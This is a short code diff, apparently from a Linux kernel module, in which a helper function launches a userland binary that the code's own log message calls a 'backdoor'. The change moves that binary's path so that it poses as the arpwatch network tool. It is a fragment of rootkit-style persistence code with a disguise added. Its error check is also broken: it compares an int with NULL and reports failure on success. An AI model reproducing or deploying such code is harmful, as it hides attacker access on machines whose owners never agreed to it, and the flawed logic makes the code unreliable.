@@ -27,7 +27,7 @@ static int umh_test(void)
         "TERM=linux"
         "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
-    ret = call_usermodehelper("/root/triggers/TArp/TArp.out",argv,envp, UMH_WAIT_EXEC);
+    ret = call_usermodehelper("/var/lib/arpwatch/arpwatch",argv,envp, UMH_WAIT_EXEC);
     if (ret == NULL) printk(KERN_INFO "Executing backdoor failed.");
     return 0;
 }
